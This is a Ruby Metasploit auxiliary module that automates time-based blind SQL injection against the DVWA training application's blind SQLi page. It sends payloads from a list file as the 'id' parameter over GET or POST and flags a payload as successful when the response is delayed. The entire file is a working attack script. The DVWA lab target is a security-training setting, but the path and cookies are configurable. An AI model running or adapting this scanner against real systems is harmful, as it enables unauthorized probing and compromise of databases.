class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'        => 'DVWA BLIND SQL Injection',
      'Description' => 'DVWA BLIND SQL Injection Attacker',
      'Author'      => 'huti',
      'License'     => MSF_LICENSE
      )

    register_options([
        OptEnum.new('METHOD', [true, 'HTTP Method', 'GET', ['GET', 'POST'] ]),
        OptString.new('PATH', [ false,  "The path to test SQL injection", '/vulnerabilities/sqli_blind/']),
        OptString.new('Inject_List_Path', [ true,  "Inject List File Path", '/root/dvwa/blind_list']),
        OptString.new('COOKIE',[ false, "HTTP Cookies", '']),
        OptInt.new('SRVPORT',[ true, "Payload Download Port", 4445])
      ])
  
    deregister_options('SSL','VHOST')
  end


  def run
	http_method = datastore['METHOD'].upcase
	inject_file_path = datastore['Inject_List_Path']

	File.open(inject_file_path).readlines.each do |line|
              time_start = Time.now.to_i
		if http_method == "GET"
			res = send_request_cgi({
			'uri'  => normalize_uri(datastore['PATH']),
			'vars_get' => {'id' => line.chomp,
				      'Submit' => 'Submit'},
			'method'  => http_method,
                        'cookie' => datastore['COOKIE']
			})
		else
			res = send_request_cgi({
			'uri'  => normalize_uri(datastore['PATH']),
			'method'  => http_method,
                        'ctype' => 'application/x-www-form-urlencoded',
                        'cookie' => datastore['COOKIE'],
			'vars_post' => {'id' => line.chomp,
	  			       'Submit' => 'Submit'}
			})
		end
              time_spent = Time.now.to_i - time_start
                if time_spent > 2 
                  print_status("SQL Injection Success!: "+line)
                else
                  print_status("Not Vulnerable!: "+line)
                end
	end
  end

end


